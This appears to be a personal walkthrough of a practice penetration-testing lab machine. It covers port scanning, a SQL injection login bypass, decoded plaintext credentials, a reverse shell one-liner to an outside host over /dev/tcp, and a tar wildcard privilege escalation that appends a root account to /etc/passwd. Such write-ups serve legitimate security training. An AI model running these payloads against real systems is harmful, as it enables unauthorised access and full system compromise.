### Enumeration
```
IP=192.168.239.10
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80,9090 -A $IP
```
### Ports 
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- 80
	- Apache httpd 2.4.41 ((Ubuntu))
- 9090
	- ssl/zeus-admin
- OS: Linux
### Foothold
- 80
	- ![[Pasted image 20240702134636.png]]
	- dirsearch -u http://$IP
		- `/login.php  /js`
	- /login.php
		- blaze login page
		- ![[Pasted image 20240702135138.png]]
		- added blaze.offsec to /etc/host
	- Login
		- tried admin:admin
		- admin':admin
			- Error in SQL syntax
		- admin' OR 1=1 -- -:admin
			- you have been blocked due to illegal blah blah
		- Used  /usr/share/seclists/Fuzzing/SQLi/MySQL-SQLi-Login-Bypass.fuzzdb.txt
			- `'OR '' = '` works
	- Logged in
		- james:Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
			- echo 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=' | base64 -d
				- canttouchhhthiss@455152
		- cameron:dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
		- ![[Pasted image 20240702143120.png]]
- 9090
	- ![[Pasted image 20240702135730.png]]
	- james:canttouchhhthiss@455152
		- Successful
	- ![[Pasted image 20240702143228.png]]
	- Use terminal to have /bin/bash access
	- Used `/bin/bash -i >& /dev/tcp/192.168.45.195/8000 0>&1`
### PE
#### Linux
- james
	- id
		- uid=1000(james) gid=1000(james) groups=1000(james)
	- sudo -l
		- `(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *`
			- https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
			- tar with wildcard exploit
			- The wildcard is replaced with file names. So we can execute commands
			- Ran following commands
				- `echo "" > '--checkpoint=1'`
				- `echo "" > '--checkpoint-action=exec=sh privesc.sh'`
				- `echo "echo 'root2:$1$3.pqoypX$fqH2guM82wDYRfKgvUAcK/:0:0:root:/root:/bin/bash' >> /etc/passwd" > privesc.sh`
				- 
				- ![[Pasted image 20240702144207.png]]
### Lessons Learned
- don't rely on sqlmap to do it
- try sqli payloads from seclists to see if you get a login